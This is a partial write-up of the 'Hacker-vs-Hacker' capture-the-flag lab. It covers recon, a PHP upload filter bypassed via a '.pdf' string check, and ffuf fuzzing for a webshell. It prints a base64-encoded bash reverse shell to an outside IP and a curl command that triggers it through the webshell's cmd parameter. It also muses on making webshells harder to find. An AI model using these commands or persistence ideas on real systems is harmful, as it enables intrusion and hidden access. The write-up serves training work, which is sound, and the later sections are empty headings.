# Hacker-vs-Hacker Helped-Through

Name: Hacker-vs-Hacker
Date:  28/1/23
Difficulty:  Easy
Goals:  
- Research Countermeasures
- Improve the counter measures
- Invent or research booby trapping 
- Get DFIR theory-crafting 
Learnt:
Beyond Root:
- Booby traps for battlegrounds
- Better \*-shells for persistence - not the shell code just location, naming, parametres

![1080](thememes.png)

The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?

## Recon


The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

THM machine and the comments on the webpages
![](comments.png)

Testing the file upload
![](testingthefileupload.png)
My guess is that the "hacker" is calling out poorly coded php 

cvs directory listing is disabled.
![](possibledirs.png)

Upload test.pdf
![](hmm.png)
Confirmed suspicions, Al mentions that [Conficker](https://en.wikipedia.org/wiki/Conficker) a computer worm patch the vulnerability after getting RCE to prevent other from exploiting the box after it gained access.

The most interesting part is actually the idea that you have to change you methodology for looking for a specifics that a related to hacking. So fuzzing for the webshell is actually considering how he bypassed the original. And although not staeted on stream this adjustment is:
- Hacker has exploited the file upload form, pictured above.
- This code only checks for if there is has a .pdf in the string with [strpos](https://www.php.net/manual/en/function.strpos.php)
-  So with it being an apache web server the deduction need to be made is that it is exploited either with a file that file.pdf.`$php` or file.`$php`.pdf with `$php` potential being various varients

![](ffufforthewin.png)
```bash
ffuf -u http://10.10.72.190/cvs/FUZZ.FUZZ1.FUZZ2 -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt:FUZZ1 -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt:FUZZ2 -w webshell-names.txt:FUZZ
```


The capabilities of the attacker can be accessed by the naming of the both the file and the parametre used for code execution, from a pure DFIR perspective this not complex, but also not complex enough to be APT-level. The reason this rather benign points is here is that there are ways to improve this that would indicate the motive:
- If it was a randomized file name it would be harder to find for other APTs
- If the parametre is a randomized string, even if the file was found or leaked out some how at another part of the attack chain traces it code excution for other would be prevented  - as cmd is the parametre
- If it was false flagging this is a fake attack chain laid to for whatever reason present because of something related to overall objectives such that it is required to spend time to false flag
	- Potentially being caught to thow of purple team
	- Misleading purple into not considering more complex forms of persistence
```bash
base64encodedpayload=$(echo "/bin/bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/1338 <&1'" | base64 -w0)

curl http://10.10.72.190/cvs/shell.pdf.php?cmd=%22%65%63%68%6f%20%24%62%61%73%65%36%34%65%6e%63%6f%64%65%64%70%61%79%6c%6f%61%64%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%22
```


## Exploit

## Foothold

## PrivEsc

## Beyond Root

I really want to make a couple of machines with this kind of path with obstacles.


